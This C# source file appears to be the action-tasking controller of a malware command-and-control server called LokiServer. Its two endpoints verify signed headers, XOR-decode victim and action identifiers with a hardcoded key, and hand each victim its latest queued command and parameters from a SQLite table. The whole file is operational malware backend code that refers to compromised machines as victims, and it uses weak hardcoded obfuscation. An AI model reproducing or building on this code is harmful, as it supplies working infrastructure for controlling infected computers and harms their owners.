using System;
using System.Data.SQLite;
using Microsoft.AspNetCore.Mvc;
using LokiServer;
using Microsoft.Extensions.Hosting;

namespace LokiServer.Controllers
{

    public class Request
    {
        public string id { get; set; }
    }

    public class DoRequest
    {
        public string victimID { get; set; }
        public string actionID { get; set; }
    }

    [ApiController]
    [Route("[controller]")]
    public class ActionController : Controller
    {
        [HttpPost]
        public string Post([FromBody] Request id)
        {
            string host = Request.Host.Value;
            string XAppTimestamp = Request.Headers["X-App-Timestamp"];
            string XAppSignature = Request.Headers["X-App-Signature"];
            string url = "/Action";
            if (Utils.validateAPIRequest(XAppTimestamp, XAppSignature, url, Request.Method))
            {
                string decryptedID = Utils.XOR(id.id, "S12Secret");
                SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
                conn.Open();
                string query = "SELECT * FROM Action WHERE VictimID = @VictimID ORDER BY ID DESC LIMIT 1";

                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                {
                    cmd.Parameters.AddWithValue("@VictimID", decryptedID);
                    using SQLiteDataReader reader = cmd.ExecuteReader();
                    if (reader.Read())
                    {
                        string actionID = reader.GetInt32(reader.GetOrdinal("ActionID")).ToString();
                        string action = reader.GetInt32(reader.GetOrdinal("ID")).ToString();
                        return actionID + "," + action;
                    }
                }
            }
            return "";
        }

        [HttpPost("DoAction")]
        public string DoAction([FromBody] DoRequest request)
        {
            string host = Request.Host.Value;
            string XAppTimestamp = Request.Headers["X-App-Timestamp"];
            string XAppSignature = Request.Headers["X-App-Signature"];
            string url = "/Action/DoAction";
            if (Utils.validateAPIRequest(XAppTimestamp, XAppSignature, url, Request.Method))
            {
                string decryptedID = Utils.XOR(request.victimID, "S12Secret");
                string decryptedActionID = Utils.XOR(request.actionID, "S12Secret");

                SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
                conn.Open();
                string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = @ActionID";

                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                {
                    cmd.Parameters.AddWithValue("@VictimID", decryptedID);
                    cmd.Parameters.AddWithValue("@ActionID", decryptedActionID);

                    using (SQLiteDataReader reader = cmd.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            string parameters = reader["Parameters"].ToString();
                            return parameters;
                        }
                    }
                }
            }
            return "";
        }
    }
}
